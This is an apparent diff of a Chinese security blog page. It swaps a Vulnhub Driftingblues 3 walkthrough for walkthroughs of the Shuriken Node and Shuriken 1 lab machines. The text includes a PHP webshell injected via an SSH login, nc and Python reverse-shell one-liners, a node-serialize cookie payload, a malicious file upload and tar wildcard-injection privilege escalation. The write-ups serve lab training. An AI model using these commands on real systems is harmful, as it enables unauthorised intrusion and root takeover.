-<h4><span id="flags">Flags：</span></h4><p>robertj:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
-<h4><span id="难度简单">难度：简单</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名driftingblues3ova">文件名：driftingblues3.ova</span></h4><h4><span id="文件大小483mb">文件大小：483MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagedriftingbluesdriftingblues3ova">下载地址：</span></h4><h4><span id="md5-987d997bc77205b54c61a9cdf745a73a">MD5: 987D997BC77205B54C61A9CDF745A73A</span></h4><h4><span id="sha1-de17551e53c73792b41a190b1302df78411a65b1">SHA1: DE17551E53C73792B41A190B1302DF78411A65B1</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机driftingblues3和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/06/06/Driftingblues-3/1.png" alt="image-"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现开放了22和80端口，访问主页查看源码，没有什么发现：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.115 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/4.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-3/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，发现有好几个可疑目录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.115/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/6.png" alt="image-"></p>
-</blockquote>
-<h3><span id="ssh写入webshell">SSH写入webshell</span></h3><blockquote>
-<p>1.访问192.168.56.115&#x2F;robots.txt，进一步访问&#x2F;eventadmins，告知我们ssh有问题，再访问&#x2F;littlequeenofspades.html，源码里有一串base64编码字符：</p>
-<p><img src="/2022/06/06/Driftingblues-3/7.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-3/8.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-3/9.png" alt="image-"></p>
-<p>2.对字符串解码两次，发现是一个路径&#x2F;adminsfixit.php，继续访问，发现一个ssh auth log文件：</p>
-<p><img src="/2022/06/06/Driftingblues-3/10.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-3/11.png" alt="image-"></p>
-<p>3.仔细观察，发现输出了我们的验证信息，也就是ssh相关的输出会回显在这个页面上，我们可以尝试写入shell：</p>
-<p><img src="/2022/06/06/Driftingblues-3/12.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh &#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;@192.168.56.115，kali注入webshell</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/13.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http://192.168.56.115/adminsfixit.php?cmd=cat%20/etc/passwd</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/14.png" alt="image-"></p>
-<p>4.在kali开启端口监听，对<a target="_blank" rel="noopener" href="http://192.168.56.115/adminsfixit.php?cmd=nc%20-e%20/bin/bash%20192.168.56.102%201234%E8%AE%BF%E9%97%AE%E8%A7%A6%E5%8F%91shell%EF%BC%9A">http://192.168.56.115/adminsfixit.php?cmd=nc%20-e%20/bin/bash%20192.168.56.102%201234访问触发shell：</a></p>
-<p><img src="/2022/06/06/Driftingblues-3/15.png" alt="image-"></p>
+<h3><span id="nodejs漏洞利用">Node.js漏洞利用</span></h3><blockquote>
+<p>1.根据主页提示，我们需要关注Node.js相关的问题，在exploit-db查询node.js相关的漏洞（<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41289%EF%BC%89%EF%BC%9A">https://www.exploit-db.com/exploits/41289）：</a></p>
+<p><img src="/2022/08/24/Shuriken-Node/7.png" alt="image-"></p>
+<p>2.根据漏洞文档描述，我们在<a target="_blank" rel="noopener" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py%E4%B8%8B%E8%83%BD%E5%A4%9F%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%9C%A8kali%E4%B8%8A%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%8B%EF%BC%9A">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py下能够找到利用程序，在kali上获取一下：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/8.png" alt="image-"></p>
+<p>3.利用nodejsshell.py生成设定的ip和端口的shellcode，根据漏洞文档描述，要将shellcode加载后进行base64编码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python nodejsshell.py 192.168.56.102 9002</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/9.png" alt="image-"></p>
+<p>4.利用漏洞文档提供的加载器，再在<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/%E4%B8%8A%E8%BF%9B%E8%A1%8Cbase64%E8%BD%AC%E6%8D%A2%E5%90%8E%EF%BC%8Ckali%E7%9B%91%E5%90%AC%E5%AF%B9%E5%BA%94%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%8A%8Apayload%E6%B3%A8%E5%85%A5%E5%88%B0cookie%E4%B8%AD%EF%BC%9A">https://gchq.github.io/CyberChef/上进行base64转换后，kali监听对应端口，把payload注入到cookie中：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#125;()&quot;&#125;，加载器</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/10.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-Node/11.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-Node/12.png" alt="image-"></p>
 </blockquote>
 <h3><span id="ssh免密登录初步提权">SSH免密登录，初步提权</span></h3><blockquote>
-<p>1.我们可以查看&#x2F;home&#x2F;robertj目录，下面有第一个flag，user.txt，但是我们无权查看：</p>
-<p><img src="/2022/06/06/Driftingblues-3/16.png" alt="image-"></p>
-<p>2.查看同目录下的.ssh目录，发现里面没有rsa等文件，则我们可以生成rsa并将私钥复制到kali用于免密登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd .ssh</span><br><span class="line">ssh-keygen -t rsa，注意生成目录的修改</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/17.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-3/18.png" alt="image-"></p>
-<p><img src="/2022/06/06/Driftingblues-3/19.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat rsa_key.pub &gt; authorized_keys，将公钥写入authorized_keys</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/20.png" alt="image-"></p>
-<p>3.在kali使用私钥ssh登录，可以查看user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 priv_key，添加权限</span><br><span class="line">ssh robertj@192.168.56.115 -I priv_key</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/21.png" alt="image-"></p>
+<p>1.注入cookie后，我们就获得了shell，利用python构建交互式shell：</p>
+<p><img src="/2022/08/24/Shuriken-Node/13.png" alt="image-"></p>
+<p>2.查看文件权限，发现&#x2F;var&#x2F;backups目录下有ssh-backup.zip文件，解压后得到一个id_rsa：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la /var/backups</span><br><span class="line">unzip ssh-backup.zip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/14.png" alt="image-"></p>
+<p>3.我们在&#x2F;home目录下能够再发现serv-adm用户，这个密钥很可能就是该用户的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/15.png" alt="image-"></p>
+<p>4.id_rsa是一个加密了的密钥，我们把它复制到kali，利用ssh2john进行解密后ssh登录serv-adm：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim id_rsa.enc</span><br><span class="line">/usr/share/john/ssh2john.py id_rsa.enc &gt; id_rsa.hash</span><br><span class="line">john --wordlist=rockyou.txt id_rsa.hash</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/16.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in id_rsa.enc -out id_rsa，pasword是刚才john解出的密码</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line">ssh serv-adm@192.168.56.125 -i id_rsa</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/17.png" alt="image-"></p>
 </blockquote>
 <h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.查看具有sudo权限的应用，发现getinfo可以利用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 -type f -exec ls -la &#123;&#125; 2&gt;/dev/null \;</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/22.png" alt="image-"></p>
-<p>2.我们执行getinfo发现可以返回一些主机的IP信息hosts文件和os信息，那么应该是执行了ip a、cat &#x2F;etc&#x2F;hosts、uname -a的命令：</p>
-<p><img src="/2022/06/06/Driftingblues-3/23.png" alt="image-"></p>
-<p>3.我们创建一个可以执行提权的uname文件进行提权，可以在&#x2F;root目录下看到第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &quot;/bin/bash&quot; &gt; uname</span><br><span class="line">chmod +x uname</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">getinfo</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/06/06/Driftingblues-3/24.png" alt="image-"></p>
+<p>1.在ser-adm用户目录下，能够发现第一个flag，user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/18.png" alt="image-"></p>
+<p>2.利用sudo -l命令查看文件权限，发现有定时文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/19.png" alt="image-"></p>
+<p>3.我们查看一下shuriken-auto.timer，发现他定时执行shuriken-job.service，我们可以修改job为我们需要的提权程序：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/systemd/system</span><br><span class="line">ls -la</span><br><span class="line">cat shuriken-auto.timer</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/20.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano shuriken-job.service</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/21.png" alt="image-"></p>
+</blockquote>
+<h3><span id="flag获取">Flag获取</span></h3><blockquote>
+<p>1.现在我们能重启一下时间器，获得用于提权的bashroot，执行触发获得root权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop shuriken-auto.timer</span><br><span class="line">sudo systemctl start shuriken-auto.timer</span><br><span class="line">/tmp/bashroot -p</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/22.png" alt="image-"></p>
+<p>2.在&#x2F;root目录下能够发现第二个flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-Node/23.png" alt="image-"></p>
 </blockquote>
 
 
@@ -1033,7 +181,893 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Driftingblues/" rel="tag">Driftingblues</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+                <a class="tag-none-link" href="/tags/Shuriken/" rel="tag">Shuriken</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/24/Shuriken-1/">
+                Shuriken 1
+            </a>
+        </h2>
+    
+    <time>
+        Aug 24, 2022
+    </time>
+    <section class="content">
+        <h1><span id="shuriken-1">SHURIKEN: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称shuriken-1">名称：Shuriken: 1</span></h4><h4><span id="发布日期20201113">发布日期：2020.11.13</span></h4><h4><span id="作者thecyb3rw0lf">作者：TheCyb3rW0lf</span></h4><h4><span id="系列shuriken">系列：Shuriken</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>server-management:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名shuriken-1ova">文件名：Shuriken-1.ova</span></h4><h4><span id="文件大小27gb">文件大小：2.7GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshurikenshuriken-1ova">下载地址：</span></h4><h4><span id="md5-2db75b09a1dd917ffe1df20b4450d032">MD5: 2DB75B09A1DD917FFE1DF20B4450D032</span></h4><h4><span id="sha1-602f049006afe12632a1b6feb6e4860008c96d32">SHA1: 602F049006AFE12632A1B6FEB6E4860008C96D32</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机shuriken和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/24/Shuriken-1/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了80和8080端口，访问主页，查看源代码sha384字串无法解码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.124 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/4.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现&#x2F;sercet目录比较可疑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.124 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="clipbucket页登录">ClipBucket页登录</span></h3><blockquote>
+<p>1.访问&#x2F;secret目录，发现一张secret.png图片，对图片进行信息隐藏分析后没有额外结果：</p>
+<p><img src="/2022/08/24/Shuriken-1/7.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/8.png" alt="image-"></p>
+<p>2.于是根据图片提示去主页查看js代码，发现两个指向：</p>
+<p><img src="/2022/08/24/Shuriken-1/9.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/10.png" alt="image-"></p>
+<p>3.修改kali的&#x2F;etc&#x2F;hosts文件，访问<a href="http://broadcast.shuriken.local，发现需要用户名和密码：">http://broadcast.shuriken.local，发现需要用户名和密码：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/11.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/12.png" alt="image-"></p>
+<p>4.再次修改&#x2F;etc&#x2F;hosts，通过<a target="_blank" rel="noopener" href="http://shuriken.local/index.php?referer=%E8%AF%B7%E6%B1%82%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0apache%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6/etc/apache2/sites-enabled/000-default.conf%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E6%8C%87%E6%98%8E%E7%94%A8%E6%88%B7%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE%E4%B8%BA/etc/apach2/.htpasswd%EF%BC%9A">http://shuriken.local/index.php?referer=请求可以得到apache默认配置文件/etc/apache2/sites-enabled/000-default.conf，该文件指明用户文件位置为/etc/apach2/.htpasswd：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/13.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/14.png" alt="image-"></p>
+<p>5.继续读取&#x2F;etc&#x2F;apach2&#x2F;.htpasswd，可以得到用户名和密码的字串，利用hashcat结合rockyou字典破解密码：</p>
+<p><img src="/2022/08/24/Shuriken-1/15.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0&#x27; &gt; hash.txt</span><br><span class="line">hashcat -m 1600 -a 0 hash.txt rockyou.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="clipbucket漏洞利用">ClipBucket漏洞利用</span></h3><blockquote>
+<p>1.再次修改&#x2F;etc&#x2F;hosts，回到<a target="_blank" rel="noopener" href="http://broadcast.shuriken.local,登录后发现是clipbucket的页面,可以在exploit-db上找到相关的漏洞利用(https//www.exploit-db.com/exploits/44250%EF%BC%89%EF%BC%9A">http://broadcast.shuriken.local，登录后发现是ClipBucket的页面，可以在exploit-db上找到相关的漏洞利用（https://www.exploit-db.com/exploits/44250）：</a></p>
+<p><img src="/2022/08/24/Shuriken-1/17.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/18.png" alt="image-"></p>
+<p>2.构造payload后，对kali自带的webshell，&#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php进行修改，在kali开启对应端口监听，访问<a target="_blank" rel="noopener" href="http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1630302014b9d72e.php%E5%90%8E%E6%88%90%E5%8A%9F%E8%8E%B7%E5%BE%97shell%EF%BC%8C%E5%86%8D%E7%94%A8python%E6%9E%84%E5%BB%BA%E4%BA%A4%E4%BA%92%E5%BC%8Fshell%EF%BC%9A">http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1630302014b9d72e.php后成功获得shell，再用python构建交互式shell：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/19.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9001</span><br><span class="line">curl --basic --user &quot;developers:9972761drmfsls&quot; -F &quot;file=@php-reverse-shell.php&quot; -F &quot;plupload=1&quot; -F &quot;name=anyname.php&quot;  http://broadcast.shuriken.local/actions/beats_uploader.php</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/20.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/21.png" alt="image-"></p>
+<p><img src="/2022/08/24/Shuriken-1/22.png" alt="image-"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.利用sudo -l命令查看权限，发现可以执行npm，那么创建一个用于提权的json文件，利用npm提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/23.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo &#x27;&#123;&quot;scripts&quot;:&#123;&quot;dev&quot;:&quot;/bin/bash&quot;&#125;&#125;&#x27; &gt; package.json</span><br><span class="line">sudo -u server-management npm run dev</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/24.png" alt="image-"></p>
+<p>2.成功提权到server-management后，可以在用户目录下发现第一个flag，user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/25.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查看crontab，我们发现有一个backupsrv.sh每隔两分钟执行一次，我们可以查看下程序内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/26.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/opt/backupsrv.sh</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/27.png" alt="image-"></p>
+<p>2.查看程序后，我们知道它打开&#x2F;home&#x2F;server-management&#x2F;Documents目录并使用通配符(*) tar 参数创建它的备份，这种结构容易受到通配符注入的影响：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd Documents</span><br><span class="line">echo &quot;python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.56.102\&quot;,9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;&quot; &gt; shell.sh，先写一个shell</span><br><span class="line">echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh shell.sh&quot;，为shell创建触发</span><br><span class="line">echo &quot;&quot; &gt; --checkpoint=1</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/28.png" alt="image-"></p>
+<p>3.在kali开启对应端口监听，等待两分钟后程序定时执行得到shell为root权限：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9002</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/29.png" alt="image-"></p>
+<p>4.获得root权限后，在&#x2F;root目录下能够发现第二个flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/24/Shuriken-1/30.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Shuriken/" rel="tag">Shuriken</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
